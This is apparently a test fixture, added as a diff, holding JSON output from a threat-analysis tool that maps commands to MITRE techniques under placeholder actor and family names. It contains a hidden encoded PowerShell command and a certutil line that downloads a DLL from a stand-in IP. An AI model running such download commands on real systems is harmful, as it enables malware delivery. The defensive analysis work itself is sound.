@@ -1,0 +1,146 @@
+{
+  "behaviors": [
+    {
+      "name": "downloader"
+    },
+    {
+      "name": "persistence"
+    }
+  ],
+  "body_artifacts": [
+    {
+      "type": "url",
+      "value": "http://198.51.100.20/x.dll"
+    },
+    {
+      "type": "ip",
+      "value": "198.51.100.20"
+    }
+  ],
+  "command_investigations": [
+    {
+      "language": "powershell",
+      "lolbas": [
+        "powershell"
+      ],
+      "mitre": [
+        "T1059.001",
+        "T1027"
+      ],
+      "normalized_command": "powershell -nop -w hidden -enc SGVsbG8=",
+      "peeled_iocs": {},
+      "purpose": "PowerShell encoded command",
+      "status": "investigated",
+      "tactic": "execution"
+    },
+    {
+      "language": "cmd",
+      "lolbas": [
+        "certutil.exe"
+      ],
+      "mitre": [
+        "T1105",
+        "T1059.003"
+      ],
+      "normalized_command": "certutil.exe -f urlcache http://198.51.100.20/x.dll x.dll",
+      "peeled_iocs": {},
+      "purpose": "Certutil URL-cache abuse",
+      "status": "investigated",
+      "tactic": "command_and_control"
+    }
+  ],
+  "commands": [
+    {
+      "language": "powershell",
+      "mitre": [
+        "T1059.001",
+        "T1027"
+      ],
+      "normalized_command": "powershell -nop -w hidden -enc SGVsbG8=",
+      "purpose": "PowerShell encoded command",
+      "tactic": "execution"
+    },
+    {
+      "language": "cmd",
+      "mitre": [
+        "T1105",
+        "T1059.003"
+      ],
+      "normalized_command": "certutil.exe -f urlcache http://198.51.100.20/x.dll x.dll",
+      "purpose": "Certutil URL-cache abuse",
+      "tactic": "command_and_control"
+    }
+  ],
+  "evidence_source": null,
+  "evidence_source_url": null,
+  "investigation_summary": {
+    "lolbins_union": [
+      {
+        "binary": "powershell",
+        "mitre": [
+          "T1059.001",
+          "T1027"
+        ]
+      },
+      {
+        "binary": "certutil.exe",
+        "mitre": [
+          "T1105",
+          "T1059.003"
+        ]
+      }
+    ],
+    "techniques_union": [
+      {
+        "id": "T1059.001",
+        "name": "T1059.001"
+      },
+      {
+        "id": "T1027",
+        "name": "T1027"
+      },
+      {
+        "id": "T1105",
+        "name": "T1105"
+      },
+      {
+        "id": "T1059.003",
+        "name": "T1059.003"
+      }
+    ]
+  },
+  "iocs": null,
+  "malware_families": [
+    {
+      "name": "TestFamily"
+    }
+  ],
+  "mitre_techniques": [
+    {
+      "id": "T1059.001",
+      "name": "PowerShell",
+      "tactic": "execution"
+    },
+    {
+      "id": "T1027",
+      "name": "Obfuscated Files or Information",
+      "tactic": "defense_evasion"
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "command_and_control"
+    },
+    {
+      "id": "T1059.003",
+      "name": "Windows Command Shell",
+      "tactic": "execution"
+    }
+  ],
+  "source": null,
+  "threat_actors": [
+    {
+      "name": "TestActor"
+    }
+  ]
+}
